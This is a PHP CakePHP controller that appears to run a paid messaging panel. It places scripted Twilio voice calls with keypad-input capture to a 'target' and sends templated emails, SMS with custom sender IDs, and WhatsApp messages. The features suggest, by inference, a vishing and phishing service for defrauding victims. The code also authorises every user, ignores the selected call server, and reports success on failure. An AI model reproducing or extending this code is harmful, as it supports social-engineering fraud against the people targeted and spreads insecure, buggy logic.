<?php
App::uses('CakeTime','Utility');
App::uses('CakeEmail', 'Network/Email');

App::import('Vendor','Twilio',array('file'=>'twilio'. DS .'autoload.php'));
use Twilio\Rest\Client;

class ToolsController extends AppController {
	public $components = array('DatabaseFunction', 'ConditionBuilder');
	public $default_conditions = array();
	
	public function index() {
		$this->loadModel('VoiceTemplate');
		$template_list = $this->VoiceTemplate->find('all',array(
			'fields'=>array(
				'VoiceTemplate.id as value',
				'VoiceTemplate.name as name',
				'VoiceTemplate.path as path',
			),
			'conditions'=>array(
				'VoiceTemplate.status' => 1,
			),
			'recursive'=>-1
		));
		$template_list = Set::extract($template_list, '{n}.VoiceTemplate');
		$this->set('template_list',$template_list);
		$this->set('ios_device_list',get_ios_devices());
		
		$this->getAllDBList('VoiceApi',array('id','name'),array(),'server_list');
		$this->getAllDBList('EmailApi',array('id','username'),array(),'email_server_list');
		$this->getAllDBList('EmailTemplate',array('id','name'),array(),'email_template_list');
	}
	
	
	
	public function start_call() {
		$this->autoRender = false;
		$this->layout = "ajax";
		if($this->request->is('put') || $this->request->is('post')) {
			
			$credit_validation = $this->validate_user_credits('voice_credits');
			$required_amount = $credit_validation['required_amount'] ?? 1;
			if($credit_validation['success'] == false){
				echo json_encode($credit_validation);
				exit();
			}
			
			$country_code = $this->request->data['Call']['phone_number_selected_country_code'];
			$to_number = '+'.$country_code.$this->request->data['Call']['phone_number'];
			$template_id = $this->request->data['Call']['template'];
			$server_id = $this->request->data['Call']['server_id'];
			
			$this->loadModel('VoiceApi');
			$server_data = $this->VoiceApi->find('first',array(
				'fields'=>array(
					'VoiceApi.id',
					'VoiceApi.sid',
					'VoiceApi.token',
					'VoiceApi.phone_number',
				),
				'conditions'=>array(
					'VoiceApi.status' => 1
				)
			));
			
			if(count($server_data) <=0){
				$result = array(
					"success" => true,
					"sid" => $call->sid,
					"msg" => "Server is not active",
				);
				echo json_encode($result);
				exit();
			}
			
			$account_sid = $server_data['VoiceApi']['sid'];
			$auth_token = $server_data['VoiceApi']['token'];
			$from_number = $server_data['VoiceApi']['phone_number'];
			$to_number = $to_number;
			
			$client = new Client($account_sid, $auth_token);
			$call = $client->account->calls->create(  
				$to_number,
				$from_number,
				array(
					"method" => "POST",
					"statusCallback" => Configure::read('BASE_URL'). "webhook/call_status?server=$server_id&template=$template_id&cost=$required_amount",
					"statusCallbackEvent"=>array("initiated","ringing","answered","completed"),
					"statusCallbackMethod" => "POST",
					"url" => Configure::read('BASE_URL'). "webhook/gather?server=$server_id&template=$template_id",
				)
			);
				
			$this->loadModel('Call');
			$data['Call']['user_id'] = $this->Auth->user('id');
			$data['Call']['call_sid'] = $call->sid;
			$data['Call']['to_number'] = $to_number;
			$data['Call']['voice_api_id'] = $server_id;
			$data['Call']['voice_template_id'] = $template_id;
			$data['Call']['country_code'] = $country_code;
			$data['Call']['status'] = 1;
			
			if($this->Call->save($data)){
				
				$response['success'] = true;
				$response['sid'] = $call->sid;
				$response['msg'] = "Voice call has been successfully sent to target!";
				
				echo json_encode($response);
				exit();
				
			}else{
				
				$response['success'] = false;
				$response['msg'] = "An error occured!";

				echo json_encode($response);
				exit();
			}
		}else{
			$this->response->statusCode(403);
		}
	}
	
	public function send_email(){
		$this->autoRender = false;
		$this->layout = "ajax";
		if($this->request->is('put') || $this->request->is('post')) {
			
			$credit_validation = $this->validate_user_credits('email_credits');
			if($credit_validation['success'] == false){
				echo json_encode($credit_validation);
				exit();
			}
			
			$email_api_id = $this->request->data['Email']['email_api_id'];
			$email_template_id = $this->request->data['Email']['email_template_id'];
			
			$mail_to = $this->request->data['Email']['mail_to'];
			$subject = $this->request->data['Email']['subject'];
			$body = $this->request->data['Email']['body'];
			
			$this->loadModel('EmailApi');
			$email_server = $this->EmailApi->findById($email_api_id);
			
			if(count($email_server)>=1){
				$email_settings = array(
					'host' => $email_server['EmailApi']['host'],
					'port' => $email_server['EmailApi']['port'],
					'username' => $email_server['EmailApi']['username'],
					'password' => $email_server['EmailApi']['password'],
					'transport' => 'Smtp',
					'tls' => true
				);

				$email = new CakeEmail($email_settings);
				$email->from($email_settings['username']);
				$email->to($mail_to);
				$email->subject($subject);
				$email->emailFormat('both'); 
				
				$email_response = $email->send($body);
				
				if($email_response){
					
					$user_data = $credit_validation['data'];
					$this->User->save($user_data);
					
					$response['success'] = true;
					$response['msg'] = "Email successfully sent!";
				}else{
					$response['success'] = false;
					$response['msg'] = "An error occured, Please try again!";
				}
				
				$this->loadModel('Email');
				$data_to_save['Email'] = $this->request->data['Email'];
				$data_to_save['Email']['email_status'] = $response['success'];
				$this->Email->save($data_to_save);
				
				echo json_encode($response);
			}
		}
	}
	
	public function start_send_whatsapp(){
		$this->autoRender = false;
		$this->layout = "ajax";
		if($this->request->is('put') || $this->request->is('post')) {
			
			$credit_validation = $this->validate_user_credits('sms_credits');
			if($credit_validation['success'] == false){
				echo json_encode($credit_validation);
				exit();
			}
			
			$number = $this->request->data['Whatsapp']['phone_number'];
			$country_code = $this->request->data['Whatsapp']['phone_number_selected_country_code'];
			$message = $this->request->data['Whatsapp']['message'];
			$template = $this->request->data['Whatsapp']['template'];
			$full_number = "$country_code$number";
			
			sleep(5);
			$response_body = $this->send_whatsapp_textmebot($full_number,$template,$message);
			$response_array = json_decode($response_body[2],true);

			$result = array();
			if($response_array['status']=='success'){
				$user_data = $credit_validation['data'];
				$this->User->save($user_data);
				
				$result['success'] = true;
				$result['msg'] = 'Message successfully sent!';
			}else{
				$result['success'] = false;
				$result['msg'] = $response_array['comment'];
			}
			
			//save logs
			$this->loadModel('Sms');
			$data_to_save['Sms']['gateway_id'] = 0;
			$data_to_save['Sms']['gateway_name'] = 'Whatsapp';
			$data_to_save['Sms']['sms_api_id'] = 0;
			$data_to_save['Sms']['sender_id'] = 'Whatsapp';
			$data_to_save['Sms']['country_code'] = $country_code;
			$data_to_save['Sms']['number'] = $number;
			$data_to_save['Sms']['message'] = $message;
			$data_to_save['Sms']['user_id'] = $this->Auth->user('id');
			$data_to_save['Sms']['sms_status'] = $result['success'];
			$this->Sms->save($data_to_save);

			echo json_encode($result);
			
		}
	}
	
	public function send_sms(){
		$this->autoRender = false;
		$this->layout = "ajax";
		if($this->request->is('put') || $this->request->is('post')) {
			
			$credit_validation = $this->validate_user_credits('sms_credits');
			if($credit_validation['success'] == false){
				echo json_encode($credit_validation);
				exit();
			}
			
			$sms_api_id = $this->request->data['Sms']['sms_api_id'];
			$sms_template_id = $this->request->data['Sms']['sms_template_id'];
			
			$this->loadModel('SmsTemplate');
			$template_data = $this->SmsTemplate->find('first',array(
				'fields'=>array(
					'SmsGateway.gateway_id',
					'SmsGateway.name',
				),
				'contain'=> array('SmsGateway'),
				'conditions'=>array(
					'SmsTemplate.id'=>$sms_template_id,
				),
				'recursive'=>-1
			));
			
			$this->loadModel('SmsApi');
			$sms_server = $this->SmsApi->find('first',array(
				'contain'=>array('SmsProvider'=>'SmsProviderType'),
				'conditions'=>array(
					'SmsApi.id'=>$sms_api_id,
				),
				'recursive'=>-1
			));
			
			if(count($template_data) >=1 && count($sms_server) >=1){
				
				$server_id = $sms_server['SmsApi']['id'];
				$server_name = $sms_server['SmsApi']['name'];
				$provider = $sms_server['SmsProvider']['SmsProviderType']['module_name'];
				$server_host = $sms_server['SmsProvider']['url'];
				$username = $sms_server['SmsApi']['username'];
				$password = $sms_server['SmsApi']['password'];
				
				$gateway_id = $template_data['SmsGateway']['gateway_id'];
				$gateway_name = $template_data['SmsGateway']['name'];
				
				$sender_id = $this->request->data['Sms']['sender_id'];
				$country_code = $this->request->data['Sms']['phone_number_selected_country_code'];
				$phone_number = $this->request->data['Sms']['phone_number'];
				$recipient = "$country_code$phone_number";
				$msg = $this->request->data['Sms']['message'];
				
				$response = $this->start_send_sms($provider,$server_host,$username,$password,$gateway_id,$sender_id,$recipient,$msg);
				$response = json_decode($response,true);
				$is_success = (int) ($response['success'] ?? false);
				
				if($is_success){
					$user_data = $credit_validation['data'];
					$this->User->save($user_data);
				}
				
				$balance = $response['bal'] ?? 0;
				$this->loadModel('SmsApi');
				$this->SmsApi->updateAll(array('SmsApi.balance'=>$balance),array('SmsApi.id'=>$server_id));
				
				//save logs
				$this->loadModel('Sms');
				$data_to_save['Sms']['gateway_id'] = $gateway_id;
				$data_to_save['Sms']['gateway_name'] = $gateway_name;
				$data_to_save['Sms']['sms_api_id'] = $server_id;
				$data_to_save['Sms']['sender_id'] = $sender_id;
				$data_to_save['Sms']['country_code'] = $country_code;
				$data_to_save['Sms']['number'] = $phone_number;
				$data_to_save['Sms']['message'] = $msg;
				$data_to_save['Sms']['user_id'] = $this->Auth->user('id');
				$data_to_save['Sms']['sms_status'] = $is_success;
				$this->Sms->save($data_to_save);

				unset($response['bal']);
				echo json_encode($response);
			}else{
				$response['success'] = false;
				$response['msg'] = 'Selected template or server is currently not available, Please choose different server thank you.';
				echo json_encode($response);
			}
			
		}
	}
	
	public function get_email_template($id=null){
		$this->autoRender = false;
		$this->layout = "ajax";
		
		$this->loadModel('EmailTemplate');
		$email_template = $this->EmailTemplate->findById($id);
		$email_template = $email_template['EmailTemplate']['template'] ?? '';
		echo $email_template;
	}
	
	public function get_realtime_call_status(){
		$this->autoRender = false;
		$this->layout = "ajax";

		$result = array(
			"success" => false,
			"msg" => "You are not allowed to access this page!",
		);
		
		if($this->request->is('put') || $this->request->is('post')) {
			$this->loadModel('Call');
			$data = $this->Call->find('first',array(
				'conditions'=>array(
					'Call.call_sid'=>$this->request->data['sid']
				)
			));
			
			if(count($data)>=1){
				
				$result = array(
					"success" => true,
					"msg" => "Success!",
					"number" => $data['Call']['to_number'],
					"call_status" => $data['Call']['call_status'],
					"dial_error" => $data['Call']['dial_error'],
					"response" => $data['Call']['response'],
				);
				
			}else{
				$result = array(
					"success" => false,
					"msg" => "Call session not found!",
				);
			}
			
		}
		echo json_encode($result);
	}
	
	
	public function check_phone_number($phone){
		$this->autoRender =false;
		$url = 'https://messente.com/messente-api/number-lookup/?phone_number=%2B'.$phone;
		$web_response = get_url_response($url);
		$response_body = $web_response[2];	
		echo $response_body;
	}
	
	public function get_sms_country_servers($country_code){
		$this->autoRender = false;
		
		$this->loadModel('SmsApi');
		$this->SmsApi->virtualFields =array(
			'provider' => "SmsProvider.id"
		);
		
		$data = $this->SmsApi->find('all',array(
			'fields'=>array(
				'DISTINCT SmsApi.id as value',
				'SmsApi.provider',
				'SmsApi.name as name',
			),
			'joins'=>array(
				array(
					'table' => 'sms_templates',
					'alias' => 'SmsTemplate',
					'type' => 'LEFT',
					'conditions' => array(
						'SmsTemplate.sms_provider_id = SmsApi.sms_provider_id'
					),
				),
			),
			'contain'=>array('SmsProvider'),
			'recursive'=>-1,
			'order'=> array('SmsApi.name' => 'ASC'),
			'conditions'=>array(
				'SmsTemplate.country_code' => $country_code,
				'SmsApi.status' => 1,
			),
		));
		
		$data = Set::extract($data, '{n}.SmsApi');
		echo json_encode($data);
	}
	
	
	public function get_sms_server_api($country_code,$provider_id){
		$this->autoRender = false;
		
		$this->loadModel('SmsTemplate');
		$this->SmsTemplate->virtualFields =array(
			'name' => "CONCAT(SmsGateway.name,', ',SmsTemplate.carrier_name,' (',SmsTemplate.sender_id,')')"
		);
		
		$data = $this->SmsTemplate->find('list',array(
			'fields'=>array(
				'SmsTemplate.id',
				'SmsTemplate.name',
			),
			'contain' => array('SmsGateway','SmsProvider'),
			'conditions'=>array(
				'SmsTemplate.country_code'=>$country_code,
				'SmsTemplate.sms_provider_id'=>$provider_id,
				'SmsTemplate.status'=>1,
				'SmsProvider.status'=>1,
			),
			'recursive'=>-1
		));
		
		echo json_encode($data);
	}
	
	
	public function get_sms_template($template_id=null){
		$this->autoRender = false;
		
		$this->loadModel('SmsTemplate');
		$data = $this->SmsTemplate->find('first',array(
			'fields'=>array(
				'SmsTemplate.sender_id',
				'SmsTemplate.template',
			),
			'conditions'=>array(
				'SmsTemplate.id'=>$template_id
			),
			'recursive'=>-1
		));
		$data = Set::extract($data, 'SmsTemplate');
		echo json_encode($data);
	}
	
	public function isAuthorized($user) {
		return true;
	}

}
?>